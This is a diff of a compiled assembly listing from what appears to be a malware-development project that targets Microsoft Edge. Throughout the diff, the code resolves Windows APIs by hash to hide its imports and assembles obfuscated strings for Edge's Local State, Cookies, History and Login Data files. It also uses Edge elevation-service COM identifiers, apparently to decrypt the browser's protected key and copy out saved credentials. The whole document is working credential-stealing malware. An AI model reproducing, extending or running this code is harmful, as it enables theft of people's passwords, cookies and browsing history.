@@ -25,13 +25,13 @@ EXTRN	__chkstk:PROC
 _TEXT	SEGMENT
 main	PROC
 ; File C:\Users\vuong\Documents\GitHub\MalDev\BrowserDecryptData\KeyEdgeExtractShell\main.cpp
-; Line 758
+; Line 777
 $LN3:
 	sub	rsp, 40					; 00000028H
-; Line 759
+; Line 778
 	call	?DecryptKey@@YAXXZ			; DecryptKey
 	npad	1
-; Line 760
+; Line 779
 	xor	eax, eax
 	add	rsp, 40					; 00000028H
 	ret	0
@@ -42,11 +42,11 @@ _TEXT	SEGMENT
 apiResolve$ = 64
 i$1 = 72
 hr$ = 76
-cookiesFilename$ = 80
-historyFilename$ = 96
-passwordFilename$ = 112
-sMal$ = 128
-lpKernel32$ = 144
+lpKernel32$ = 80
+cookiesFilename$ = 88
+historyFilename$ = 104
+passwordFilename$ = 120
+sMal$ = 136
 network$ = 152
 patternKey$ = 168
 sOle32$ = 200
@@ -57,121 +57,125 @@ keyFileName$ = 264
 sSubEdge$ = 280
 sLocalState$ = 320
 dwFileSize$ = 360
+i$2 = 364
 keyPointer$ = 368
 sizeKeyB64$ = 376
 length$ = 380
 pLoadLibraryA$ = 384
 EdgeIID$ = 392
 EdgeCLSID$ = 408
-pElevatorEdge$ = 424
-fileBuf$ = 432
-hOle32$ = 440
-hFile$ = 448
-hOleAut32$ = 456
-decryptedDataBSTR$ = 464
-pSysFreeString$ = 472
-pCloseHandle$ = 480
-tv1066 = 488
-dwLastError$ = 492
-pSHGetFolderPathA$ = 496
-bstrEncKey$ = 504
-pCreateFileA$ = 512
-pCopyFileA$2 = 520
-pCoUninitialize$ = 528
-hFile$3 = 536
+hFile$ = 424
+pCopyFileA$3 = 432
+decryptedDataBSTR$ = 440
+fileBuf$ = 448
+hOle32$ = 456
+hOleAut32$ = 464
+pElevatorEdge$ = 472
+tv1066 = 480
+pSHGetFolderPathA$ = 488
+bstrEncKey$ = 496
+pCreateFileA$ = 504
+pSysFreeString$ = 512
+pCloseHandle$ = 520
+dwLastError$ = 528
+pWriteFile$4 = 536
 pCoInitializeEx$ = 544
-pCoCreateInstance$ = 552
+hFile$5 = 552
 pReadFile$ = 560
 pGetFileSize$ = 568
 pSysStringByteLen$ = 576
-pWriteFile$4 = 584
-pSysAllocStringByteLen$ = 592
-pCoSetProxyBlanket$ = 600
-hashCopyFileA$5 = 608
-hashCoInitializeEx$ = 612
-tv79 = 616
-tv83 = 624
-tv87 = 632
-hShell32$ = 640
-tv232 = 648
-tv254 = 656
-tv252 = 664
-tv430 = 672
-tv428 = 680
-tv441 = 688
-tv504 = 696
-tv502 = 704
-tv552 = 712
-tv550 = 720
-tv574 = 728
-tv572 = 736
-tv651 = 744
-tv649 = 752
-tv664 = 760
-tv662 = 768
-tv698 = 776
-tv696 = 784
-tv711 = 792
-tv709 = 800
-tv724 = 808
-tv722 = 816
-tv737 = 824
-tv735 = 832
-tv751 = 840
-tv762 = 848
-tv815 = 856
-tv825 = 864
-tv867 = 872
-tv865 = 880
-tv893 = 888
-tv944 = 896
-tv961 = 904
-tv968 = 912
-encKey$ = 920
-tv991 = 928
-tv1032 = 936
-tv1036 = 944
-tv1052 = 952
-tv1059 = 960
-tv1064 = 968
-hashKernel32$ = 976
-tv1080 = 984
-tv1087 = 992
-tv1091 = 1000
-tv1095 = 1008
-hashLoadLibraryA$ = 1016
-hashSHGetFolderPathA$ = 1020
-size$ = 1024
-hashCreateFileA$ = 1028
-hashGetFileSize$ = 1032
-hashReadFile$ = 1036
-hashCloseHandle$ = 1040
-hashCoUninitialize$ = 1044
-hashCoCreateInstance$ = 1048
-tv1068 = 1056
-hashCoSetProxyBlanket$ = 1064
-hashSysAllocStringByteLen$ = 1068
-hashSysStringByteLen$ = 1072
-hashSysFreeString$ = 1076
-hashWriteFile$6 = 1080
-hUser32$ = 1088
-orCookiesPath$ = 1104
-pathMal$ = 1376
-pathEdge$ = 1648
-path$ = 1920
-keyPath$ = 2192
-cookiesPath$ = 2464
-historyPath$ = 2736
-orHistoryPath$ = 3008
-passwordPath$ = 3280
-orPasswordPath$ = 3552
+pSysAllocStringByteLen$ = 584
+pCoSetProxyBlanket$ = 592
+pCoUninitialize$ = 600
+pCoCreateInstance$ = 608
+hashCopyFileA$6 = 616
+hashSleep$7 = 620
+hashCoInitializeEx$ = 624
+tv79 = 632
+tv83 = 640
+tv87 = 648
+hShell32$ = 656
+tv232 = 664
+tv254 = 672
+tv252 = 680
+tv430 = 688
+tv428 = 696
+tv441 = 704
+tv504 = 712
+tv502 = 720
+tv552 = 728
+tv550 = 736
+tv574 = 744
+tv572 = 752
+tv651 = 760
+tv649 = 768
+tv664 = 776
+tv662 = 784
+tv698 = 792
+tv696 = 800
+tv711 = 808
+tv709 = 816
+tv724 = 824
+tv722 = 832
+tv737 = 840
+tv735 = 848
+tv751 = 856
+tv762 = 864
+tv815 = 872
+tv825 = 880
+tv867 = 888
+tv865 = 896
+tv893 = 904
+tv944 = 912
+tv961 = 920
+tv968 = 928
+encKey$ = 936
+tv991 = 944
+tv1032 = 952
+tv1036 = 960
+tv1052 = 968
+tv1059 = 976
+tv1064 = 984
+hashKernel32$ = 992
+tv1089 = 1000
+tv1096 = 1008
+tv1103 = 1016
+tv1107 = 1024
+tv1111 = 1032
+hashLoadLibraryA$ = 1040
+hashSHGetFolderPathA$ = 1044
+size$ = 1048
+hashCreateFileA$ = 1052
+hashGetFileSize$ = 1056
+hashReadFile$ = 1060
+hashCloseHandle$ = 1064
+hashCoUninitialize$ = 1068
+tv1068 = 1072
+hashCoCreateInstance$ = 1080
+hashCoSetProxyBlanket$ = 1084
+hashSysAllocStringByteLen$ = 1088
+hashSysStringByteLen$ = 1092
+hashSysFreeString$ = 1096
+hashWriteFile$8 = 1100
+pSleep$9 = 1104
+hUser32$ = 1112
+orCookiesPath$ = 1120
+pathMal$ = 1392
+pathEdge$ = 1664
+path$ = 1936
+cookiesPath$ = 2208
+keyPath$ = 2480
+historyPath$ = 2752
+orHistoryPath$ = 3024
+passwordPath$ = 3296
+orPasswordPath$ = 3568
 ?DecryptKey@@YAXXZ PROC					; DecryptKey
 ; File C:\Users\vuong\Documents\GitHub\MalDev\BrowserDecryptData\KeyEdgeExtractShell\main.cpp
-; Line 433
-$LN38:
+; Line 440
+$LN43:
 	push	rdi
-	sub	rsp, 3824				; 00000ef0H
-; Line 434
+	sub	rsp, 3840				; 00000f00H
+; Line 441
 	mov	DWORD PTR EdgeCLSID$[rsp], 533457260	; 1fcbe96cH
 	mov	eax, 5783				; 00001697H
 	mov	WORD PTR EdgeCLSID$[rsp+4], ax
@@ -185,7 +189,7 @@ $LN38:
 	mov	BYTE PTR EdgeCLSID$[rsp+13], 198	; 000000c6H
 	mov	BYTE PTR EdgeCLSID$[rsp+14], 151	; 00000097H
 	mov	BYTE PTR EdgeCLSID$[rsp+15], 103	; 00000067H
-; Line 435
+; Line 442
 	mov	DWORD PTR EdgeIID$[rsp], -909985785	; c9c2b807H
 	mov	eax, 30513				; 00007731H
 	mov	WORD PTR EdgeIID$[rsp+4], ax
@@ -199,45 +203,45 @@ $LN38:
 	mov	BYTE PTR EdgeIID$[rsp+13], 121		; 00000079H
 	mov	BYTE PTR EdgeIID$[rsp+14], 82		; 00000052H
 	mov	BYTE PTR EdgeIID$[rsp+15], 43		; 0000002bH
-; Line 436
+; Line 443
 	mov	QWORD PTR pElevatorEdge$[rsp], 0
-; Line 439
+; Line 446
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??0ApiResolve@@QEAA@XZ			; ApiResolve::ApiResolve
-; Line 440
+; Line 447
 	mov	DWORD PTR hashKernel32$[rsp], 764661557	; 2d93cf35H
-; Line 441
+; Line 448
 	mov	edx, 764661557				; 2d93cf35H
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetModuleBaseAddress@ApiResolve@@QEAAPEAXI@Z ; ApiResolve::GetModuleBaseAddress
 	mov	QWORD PTR lpKernel32$[rsp], rax
-; Line 442
-	cmp	QWORD PTR lpKernel32$[rsp], 0
-	jne	SHORT $LN5@DecryptKey
-; Line 443
-	lea	rcx, QWORD PTR apiResolve$[rsp]
-	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
-	npad	1
-	jmp	$LN1@DecryptKey
-$LN5@DecryptKey:
-; Line 447
-	mov	DWORD PTR hashLoadLibraryA$[rsp], -462133483 ; e4746715H
-; Line 448
-	mov	r8d, -462133483				; e4746715H
-	mov	rdx, QWORD PTR lpKernel32$[rsp]
-	lea	rcx, QWORD PTR apiResolve$[rsp]
-	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
-	mov	QWORD PTR pLoadLibraryA$[rsp], rax
 ; Line 449
-	cmp	QWORD PTR pLoadLibraryA$[rsp], 0
-	jne	SHORT $LN6@DecryptKey
+	cmp	QWORD PTR lpKernel32$[rsp], 0
+	jne	SHORT $LN8@DecryptKey
 ; Line 450
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN6@DecryptKey:
-; Line 453
+$LN8@DecryptKey:
+; Line 454
+	mov	DWORD PTR hashLoadLibraryA$[rsp], -462133483 ; e4746715H
+; Line 455
+	mov	r8d, -462133483				; e4746715H
+	mov	rdx, QWORD PTR lpKernel32$[rsp]
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
+	mov	QWORD PTR pLoadLibraryA$[rsp], rax
+; Line 456
+	cmp	QWORD PTR pLoadLibraryA$[rsp], 0
+	jne	SHORT $LN9@DecryptKey
+; Line 457
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
+	npad	1
+	jmp	$LN1@DecryptKey
+$LN9@DecryptKey:
+; Line 460
 	mov	BYTE PTR sOle32$[rsp], 79		; 0000004fH
 	mov	BYTE PTR sOle32$[rsp+1], 108		; 0000006cH
 	mov	BYTE PTR sOle32$[rsp+2], 101		; 00000065H
@@ -248,13 +252,13 @@ $LN6@DecryptKey:
 	mov	BYTE PTR sOle32$[rsp+7], 108		; 0000006cH
 	mov	BYTE PTR sOle32$[rsp+8], 108		; 0000006cH
 	mov	BYTE PTR sOle32$[rsp+9], 0
-; Line 454
+; Line 461
 	mov	rax, QWORD PTR pLoadLibraryA$[rsp]
 	mov	QWORD PTR tv79[rsp], rax
 	lea	rcx, QWORD PTR sOle32$[rsp]
 	call	QWORD PTR tv79[rsp]
 	mov	QWORD PTR hOle32$[rsp], rax
-; Line 456
+; Line 463
 	mov	BYTE PTR sUser32$[rsp], 117		; 00000075H
 	mov	BYTE PTR sUser32$[rsp+1], 115		; 00000073H
 	mov	BYTE PTR sUser32$[rsp+2], 101		; 00000065H
@@ -266,13 +270,13 @@ $LN6@DecryptKey:
 	mov	BYTE PTR sUser32$[rsp+8], 108		; 0000006cH
 	mov	BYTE PTR sUser32$[rsp+9], 108		; 0000006cH
 	mov	BYTE PTR sUser32$[rsp+10], 0
-; Line 457
+; Line 464
 	mov	rax, QWORD PTR pLoadLibraryA$[rsp]
 	mov	QWORD PTR tv83[rsp], rax
 	lea	rcx, QWORD PTR sUser32$[rsp]
 	call	QWORD PTR tv83[rsp]
 	mov	QWORD PTR hUser32$[rsp], rax
-; Line 459
+; Line 466
 	mov	BYTE PTR sShell32$[rsp], 83		; 00000053H
 	mov	BYTE PTR sShell32$[rsp+1], 104		; 00000068H
 	mov	BYTE PTR sShell32$[rsp+2], 101		; 00000065H
@@ -285,35 +289,35 @@ $LN6@DecryptKey:
 	mov	BYTE PTR sShell32$[rsp+9], 108		; 0000006cH
 	mov	BYTE PTR sShell32$[rsp+10], 108		; 0000006cH
 	mov	BYTE PTR sShell32$[rsp+11], 0
-; Line 460
+; Line 467
 	mov	rax, QWORD PTR pLoadLibraryA$[rsp]
 	mov	QWORD PTR tv87[rsp], rax
 	lea	rcx, QWORD PTR sShell32$[rsp]
 	call	QWORD PTR tv87[rsp]
 	mov	QWORD PTR hShell32$[rsp], rax
-; Line 468
+; Line 475
 	mov	DWORD PTR hashSHGetFolderPathA$[rsp], -1368526292 ; ae6df22cH
-; Line 469
+; Line 476
 	mov	r8d, -1368526292			; ae6df22cH
 	mov	rdx, QWORD PTR hShell32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
 	mov	QWORD PTR pSHGetFolderPathA$[rsp], rax
-; Line 470
+; Line 477
 	cmp	QWORD PTR pSHGetFolderPathA$[rsp], 0
-	jne	SHORT $LN7@DecryptKey
+	jne	SHORT $LN10@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN7@DecryptKey:
-; Line 471
+$LN10@DecryptKey:
+; Line 478
 	lea	rax, QWORD PTR path$[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 260				; 00000104H
 	rep stosb
-; Line 472
+; Line 479
 	mov	rax, QWORD PTR pSHGetFolderPathA$[rsp]
 	mov	QWORD PTR tv232[rsp], rax
 	lea	rax, QWORD PTR path$[rsp]
@@ -324,25 +328,25 @@ $LN7@DecryptKey:
 	xor	ecx, ecx
 	call	QWORD PTR tv232[rsp]
 	test	eax, eax
-	je	SHORT $LN8@DecryptKey
-; Line 473
+	je	SHORT $LN11@DecryptKey
+; Line 480
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN8@DecryptKey:
-; Line 476
+$LN11@DecryptKey:
+; Line 483
 	lea	rax, QWORD PTR pathEdge$[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 260				; 00000104H
 	rep stosb
-; Line 477
+; Line 484
 	mov	r8d, 260				; 00000104H
 	lea	rdx, QWORD PTR pathEdge$[rsp]
 	lea	rcx, QWORD PTR path$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 479
+; Line 486
 	mov	BYTE PTR sSubEdge$[rsp], 92		; 0000005cH
 	mov	BYTE PTR sSubEdge$[rsp+1], 77		; 0000004dH
 	mov	BYTE PTR sSubEdge$[rsp+2], 105		; 00000069H
@@ -354,13 +358,13 @@ $LN8@DecryptKey:
 	mov	BYTE PTR sSubEdge$[rsp+8], 102		; 00000066H
 	mov	BYTE PTR sSubEdge$[rsp+9], 116		; 00000074H
 	mov	BYTE PTR sSubEdge$[rsp+10], 92		; 0000005cH
-; Line 480
+; Line 487
 	mov	BYTE PTR sSubEdge$[rsp+11], 69		; 00000045H
 	mov	BYTE PTR sSubEdge$[rsp+12], 100		; 00000064H
 	mov	BYTE PTR sSubEdge$[rsp+13], 103		; 00000067H
 	mov	BYTE PTR sSubEdge$[rsp+14], 101		; 00000065H
 	mov	BYTE PTR sSubEdge$[rsp+15], 92		; 0000005cH
-; Line 481
+; Line 488
 	mov	BYTE PTR sSubEdge$[rsp+16], 85		; 00000055H
 	mov	BYTE PTR sSubEdge$[rsp+17], 115		; 00000073H
 	mov	BYTE PTR sSubEdge$[rsp+18], 101		; 00000065H
@@ -371,7 +375,7 @@ $LN8@DecryptKey:
 	mov	BYTE PTR sSubEdge$[rsp+23], 116		; 00000074H
 	mov	BYTE PTR sSubEdge$[rsp+24], 97		; 00000061H
 	mov	BYTE PTR sSubEdge$[rsp+25], 92		; 0000005cH
-; Line 482
+; Line 489
 	mov	BYTE PTR sSubEdge$[rsp+26], 68		; 00000044H
 	mov	BYTE PTR sSubEdge$[rsp+27], 101		; 00000065H
 	mov	BYTE PTR sSubEdge$[rsp+28], 102		; 00000066H
@@ -379,9 +383,9 @@ $LN8@DecryptKey:
 	mov	BYTE PTR sSubEdge$[rsp+30], 117		; 00000075H
 	mov	BYTE PTR sSubEdge$[rsp+31], 108		; 0000006cH
 	mov	BYTE PTR sSubEdge$[rsp+32], 116		; 00000074H
-; Line 483
+; Line 490
 	mov	BYTE PTR sSubEdge$[rsp+33], 0
-; Line 485
+; Line 492
 	lea	rcx, QWORD PTR pathEdge$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	ecx, 260				; 00000104H
@@ -396,7 +400,7 @@ $LN8@DecryptKey:
 	mov	rdx, QWORD PTR tv252[rsp]
 	lea	rcx, QWORD PTR sSubEdge$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 488
+; Line 495
 	mov	BYTE PTR sLocalState$[rsp], 92		; 0000005cH
 	mov	BYTE PTR sLocalState$[rsp+1], 77	; 0000004dH
 	mov	BYTE PTR sLocalState$[rsp+2], 105	; 00000069H
@@ -408,13 +412,13 @@ $LN8@DecryptKey:
 	mov	BYTE PTR sLocalState$[rsp+8], 102	; 00000066H
 	mov	BYTE PTR sLocalState$[rsp+9], 116	; 00000074H
 	mov	BYTE PTR sLocalState$[rsp+10], 92	; 0000005cH
-; Line 489
+; Line 496
 	mov	BYTE PTR sLocalState$[rsp+11], 69	; 00000045H
 	mov	BYTE PTR sLocalState$[rsp+12], 100	; 00000064H
 	mov	BYTE PTR sLocalState$[rsp+13], 103	; 00000067H
 	mov	BYTE PTR sLocalState$[rsp+14], 101	; 00000065H
 	mov	BYTE PTR sLocalState$[rsp+15], 92	; 0000005cH
-; Line 490
+; Line 497
 	mov	BYTE PTR sLocalState$[rsp+16], 85	; 00000055H
 	mov	BYTE PTR sLocalState$[rsp+17], 115	; 00000073H
 	mov	BYTE PTR sLocalState$[rsp+18], 101	; 00000065H
@@ -425,7 +429,7 @@ $LN8@DecryptKey:
 	mov	BYTE PTR sLocalState$[rsp+23], 116	; 00000074H
 	mov	BYTE PTR sLocalState$[rsp+24], 97	; 00000061H
 	mov	BYTE PTR sLocalState$[rsp+25], 92	; 0000005cH
-; Line 491
+; Line 498
 	mov	BYTE PTR sLocalState$[rsp+26], 76	; 0000004cH
 	mov	BYTE PTR sLocalState$[rsp+27], 111	; 0000006fH
 	mov	BYTE PTR sLocalState$[rsp+28], 99	; 00000063H
@@ -437,13 +441,13 @@ $LN8@DecryptKey:
 	mov	BYTE PTR sLocalState$[rsp+34], 97	; 00000061H
 	mov	BYTE PTR sLocalState$[rsp+35], 116	; 00000074H
 	mov	BYTE PTR sLocalState$[rsp+36], 101	; 00000065H
-; Line 492
+; Line 499
 	mov	BYTE PTR sLocalState$[rsp+37], 0
-; Line 494
+; Line 501
 	lea	rcx, QWORD PTR path$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	DWORD PTR size$[rsp], eax
-; Line 495
+; Line 502
 	lea	rcx, QWORD PTR path$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	ecx, 260				; 00000104H
@@ -458,13 +462,13 @@ $LN8@DecryptKey:
 	mov	rdx, QWORD PTR tv428[rsp]
 	lea	rcx, QWORD PTR sLocalState$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 497
+; Line 504
 	lea	rax, QWORD PTR pathMal$[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 260				; 00000104H
 	rep stosb
-; Line 498
+; Line 505
 	mov	rax, QWORD PTR pSHGetFolderPathA$[rsp]
 	mov	QWORD PTR tv441[rsp], rax
 	lea	rax, QWORD PTR pathMal$[rsp]
@@ -475,14 +479,14 @@ $LN8@DecryptKey:
 	xor	ecx, ecx
 	call	QWORD PTR tv441[rsp]
 	test	eax, eax
-	je	SHORT $LN9@DecryptKey
-; Line 499
+	je	SHORT $LN12@DecryptKey
+; Line 506
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN9@DecryptKey:
-; Line 502
+$LN12@DecryptKey:
+; Line 509
 	mov	BYTE PTR sMal$[rsp], 92			; 0000005cH
 	mov	BYTE PTR sMal$[rsp+1], 76		; 0000004cH
 	mov	BYTE PTR sMal$[rsp+2], 77		; 0000004dH
@@ -496,31 +500,31 @@ $LN9@DecryptKey:
 	mov	BYTE PTR sMal$[rsp+10], 97		; 00000061H
 	mov	BYTE PTR sMal$[rsp+11], 110		; 0000006eH
 	mov	BYTE PTR sMal$[rsp+12], 0
-; Line 505
+; Line 512
 	lea	rax, QWORD PTR keyPath$[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 260				; 00000104H
 	rep stosb
-; Line 506
+; Line 513
 	lea	rax, QWORD PTR cookiesPath$[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 260				; 00000104H
 	rep stosb
-; Line 507
+; Line 514
 	lea	rax, QWORD PTR historyPath$[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 260				; 00000104H
 	rep stosb
-; Line 508
+; Line 515
 	lea	rax, QWORD PTR passwordPath$[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 260				; 00000104H
 	rep stosb
-; Line 510
+; Line 517
 	lea	rcx, QWORD PTR sMal$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	ecx, 260				; 00000104H
@@ -535,12 +539,12 @@ $LN9@DecryptKey:
 	mov	rdx, QWORD PTR tv502[rsp]
 	lea	rcx, QWORD PTR sMal$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 512
+; Line 519
 	mov	r8d, 260				; 00000104H
 	lea	rdx, QWORD PTR keyPath$[rsp]
 	lea	rcx, QWORD PTR pathMal$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 513
+; Line 520
 	mov	BYTE PTR keyFileName$[rsp], 92		; 0000005cH
 	mov	BYTE PTR keyFileName$[rsp+1], 98	; 00000062H
 	mov	BYTE PTR keyFileName$[rsp+2], 114	; 00000072H
@@ -556,7 +560,7 @@ $LN9@DecryptKey:
 	mov	BYTE PTR keyFileName$[rsp+12], 100	; 00000064H
 	mov	BYTE PTR keyFileName$[rsp+13], 98	; 00000062H
 	mov	BYTE PTR keyFileName$[rsp+14], 0
-; Line 514
+; Line 521
 	lea	rcx, QWORD PTR keyPath$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	ecx, 260				; 00000104H
@@ -571,22 +575,22 @@ $LN9@DecryptKey:
 	mov	rdx, QWORD PTR tv550[rsp]
 	lea	rcx, QWORD PTR keyFileName$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 516
+; Line 523
 	mov	r8d, 260				; 00000104H
 	lea	rdx, QWORD PTR cookiesPath$[rsp]
 	lea	rcx, QWORD PTR pathMal$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 517
+; Line 524
 	mov	r8d, 260				; 00000104H
 	lea	rdx, QWORD PTR historyPath$[rsp]
 	lea	rcx, QWORD PTR pathMal$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 518
+; Line 525
 	mov	r8d, 260				; 00000104H
 	lea	rdx, QWORD PTR passwordPath$[rsp]
 	lea	rcx, QWORD PTR pathMal$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 519
+; Line 526
 	mov	BYTE PTR historyFilename$[rsp], 92	; 0000005cH
 	mov	BYTE PTR historyFilename$[rsp+1], 72	; 00000048H
 	mov	BYTE PTR historyFilename$[rsp+2], 105	; 00000069H
@@ -596,7 +600,7 @@ $LN9@DecryptKey:
 	mov	BYTE PTR historyFilename$[rsp+6], 114	; 00000072H
 	mov	BYTE PTR historyFilename$[rsp+7], 121	; 00000079H
 	mov	BYTE PTR historyFilename$[rsp+8], 0
-; Line 520
+; Line 527
 	mov	BYTE PTR cookiesFilename$[rsp], 92	; 0000005cH
 	mov	BYTE PTR cookiesFilename$[rsp+1], 67	; 00000043H
 	mov	BYTE PTR cookiesFilename$[rsp+2], 111	; 0000006fH
@@ -606,7 +610,7 @@ $LN9@DecryptKey:
 	mov	BYTE PTR cookiesFilename$[rsp+6], 101	; 00000065H
 	mov	BYTE PTR cookiesFilename$[rsp+7], 115	; 00000073H
 	mov	BYTE PTR cookiesFilename$[rsp+8], 0
-; Line 521
+; Line 528
 	mov	BYTE PTR passwordFilename$[rsp], 92	; 0000005cH
 	mov	BYTE PTR passwordFilename$[rsp+1], 76	; 0000004cH
 	mov	BYTE PTR passwordFilename$[rsp+2], 111	; 0000006fH
@@ -619,7 +623,7 @@ $LN9@DecryptKey:
 	mov	BYTE PTR passwordFilename$[rsp+9], 116	; 00000074H
 	mov	BYTE PTR passwordFilename$[rsp+10], 97	; 00000061H
 	mov	BYTE PTR passwordFilename$[rsp+11], 0
-; Line 523
+; Line 530
 	lea	rcx, QWORD PTR cookiesPath$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	ecx, 260				; 00000104H
@@ -634,7 +638,7 @@ $LN9@DecryptKey:
 	mov	rdx, QWORD PTR tv572[rsp]
 	lea	rcx, QWORD PTR cookiesFilename$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 524
+; Line 531
 	lea	rcx, QWORD PTR historyPath$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	ecx, 260				; 00000104H
@@ -649,7 +653,7 @@ $LN9@DecryptKey:
 	mov	rdx, QWORD PTR tv649[rsp]
 	lea	rcx, QWORD PTR historyFilename$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 525
+; Line 532
 	lea	rcx, QWORD PTR passwordPath$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	ecx, 260				; 00000104H
@@ -664,40 +668,40 @@ $LN9@DecryptKey:
 	mov	rdx, QWORD PTR tv662[rsp]
 	lea	rcx, QWORD PTR passwordFilename$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 527
+; Line 534
 	lea	rax, QWORD PTR orCookiesPath$[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 260				; 00000104H
 	rep stosb
-; Line 528
+; Line 535
 	lea	rax, QWORD PTR orHistoryPath$[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 260				; 00000104H
 	rep stosb
-; Line 529
+; Line 536
 	lea	rax, QWORD PTR orPasswordPath$[rsp]
 	mov	rdi, rax
 	xor	eax, eax
 	mov	ecx, 260				; 00000104H
 	rep stosb
-; Line 530
+; Line 537
 	mov	r8d, 260				; 00000104H
 	lea	rdx, QWORD PTR orCookiesPath$[rsp]
 	lea	rcx, QWORD PTR pathEdge$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 531
+; Line 538
 	mov	r8d, 260				; 00000104H
 	lea	rdx, QWORD PTR orHistoryPath$[rsp]
 	lea	rcx, QWORD PTR pathEdge$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 532
+; Line 539
 	mov	r8d, 260				; 00000104H
 	lea	rdx, QWORD PTR orPasswordPath$[rsp]
 	lea	rcx, QWORD PTR pathEdge$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 534
+; Line 541
 	mov	BYTE PTR network$[rsp], 92		; 0000005cH
 	mov	BYTE PTR network$[rsp+1], 78		; 0000004eH
 	mov	BYTE PTR network$[rsp+2], 101		; 00000065H
@@ -707,7 +711,7 @@ $LN9@DecryptKey:
 	mov	BYTE PTR network$[rsp+6], 114		; 00000072H
 	mov	BYTE PTR network$[rsp+7], 107		; 0000006bH
 	mov	BYTE PTR network$[rsp+8], 0
-; Line 536
+; Line 543
 	lea	rcx, QWORD PTR orCookiesPath$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	ecx, 260				; 00000104H
@@ -722,7 +726,7 @@ $LN9@DecryptKey:
 	mov	rdx, QWORD PTR tv696[rsp]
 	lea	rcx, QWORD PTR network$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 537
+; Line 544
 	lea	rcx, QWORD PTR orCookiesPath$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	ecx, 260				; 00000104H
@@ -737,7 +741,7 @@ $LN9@DecryptKey:
 	mov	rdx, QWORD PTR tv709[rsp]
 	lea	rcx, QWORD PTR cookiesFilename$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 538
+; Line 545
 	lea	rcx, QWORD PTR orHistoryPath$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	ecx, 260				; 00000104H
@@ -752,7 +756,7 @@ $LN9@DecryptKey:
 	mov	rdx, QWORD PTR tv722[rsp]
 	lea	rcx, QWORD PTR historyFilename$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 539
+; Line 546
 	lea	rcx, QWORD PTR orPasswordPath$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	ecx, 260				; 00000104H
